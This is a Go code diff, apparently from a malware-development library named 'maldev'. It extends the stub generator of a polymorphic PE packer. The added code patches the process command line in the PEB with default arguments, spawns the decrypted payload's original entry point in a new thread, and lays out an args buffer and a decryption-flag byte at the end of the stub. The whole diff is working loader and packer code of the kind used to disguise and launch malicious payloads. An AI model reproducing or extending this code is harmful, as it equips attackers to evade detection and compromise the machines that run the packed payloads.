@@ -5,9 +5,20 @@ import (
 	"errors"
 	"fmt"
 
+	"github.com/oioio-space/maldev/encode"
 	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
 	"github.com/oioio-space/maldev/pe/packer/stubgen/poly"
 	"github.com/oioio-space/maldev/pe/packer/transform"
+)
+
+// Trailing-data sizes for the converted-DLL stub.
+const (
+	// convertedDLLNULTermBytes is the 2-byte UTF-16 NUL terminator
+	// appended after the wide-args buffer when DefaultArgs is set.
+	convertedDLLNULTermBytes = 2
+	// convertedDLLFlagByteSize is the 1-byte decrypted_flag latch
+	// emitted at the very end of the stub (offset stub_size-1).
+	convertedDLLFlagByteSize = 1
 )
 
 // Frame sizes for the converted-DLL stub. Both keep RSP 16-aligned
@@ -218,7 +229,18 @@ func EmitConvertedDLLStub(b *amd64.Builder, plan transform.Plan, rounds []poly.R
 		}
 	}
 
-	if !opts.DiagSkipConvertedPayload && !opts.DiagSkipConvertedResolver && !opts.DiagSkipConvertedSpawn {
+	// DefaultArgs path: rewrite PEB.ProcessParameters.CommandLine
+	// before the OEP runs. RAX + R10 clobber is harmless because
+	// the CreateThread setup below loads RCX/RDX/R8/R9 fresh.
+	var defaultArgsBytes []byte
+	if opts.convertedSpawnEnabled() && opts.DefaultArgs != "" {
+		defaultArgsBytes = encode.ToUTF16LE(opts.DefaultArgs)
+		if err := EmitPEBCommandLinePatch(b, uint16(len(defaultArgsBytes))); err != nil {
+			return fmt.Errorf("stage1/converted: PEB patch: %w", err)
+		}
+	}
+
+	if opts.convertedSpawnEnabled() {
 		// --- CreateThread(NULL, 0, OEP, NULL, 0, NULL) ---
 	// Windows x64 ABI:
 	//   rcx = lpThreadAttributes      (NULL)
@@ -293,12 +315,30 @@ func EmitConvertedDLLStub(b *amd64.Builder, plan transform.Plan, rounds []poly.R
 		return fmt.Errorf("stage1/converted: ret: %w", err)
 	}
 
-	// --- trailing data: 1B decrypted_flag (no slot — we don't tail-call) ---
+	// Trailing data layout (from the end of the stub):
+	//   [args (N bytes UTF-16LE)][NUL (2 B)][flag (1 B)]
+	// Args + NUL only emitted when DefaultArgs is set. Flag stays
+	// at offset stub_size-1 either way — matches the existing
+	// ConvertedDLLStubFlagByteOffsetFromEnd contract.
+	if len(defaultArgsBytes) > 0 {
+		if err := b.RawBytes(append(defaultArgsBytes, 0x00, 0x00)); err != nil {
+			return fmt.Errorf("stage1/converted: emit args buffer + NUL: %w", err)
+		}
+	}
 	if err := b.RawBytes([]byte{0x00}); err != nil {
 		return fmt.Errorf("stage1/converted: emit decrypted_flag byte: %w", err)
 	}
 
 	return nil
+}
+
+// ConvertedDLLStubArgsBufferOffsetFromEnd is the byte offset of
+// the wide-args buffer's first byte counted from the end of the
+// emitted stub, when EmitOptions.DefaultArgs is set. Caller uses
+// this to compute the args-buffer-disp value for
+// PatchPEBCommandLineDisp.
+func ConvertedDLLStubArgsBufferOffsetFromEnd(argsBytes int) int {
+	return argsBytes + convertedDLLNULTermBytes + convertedDLLFlagByteSize
 }
 
 // ConvertedDLLStubFlagByteOffsetFromEnd is the position of the
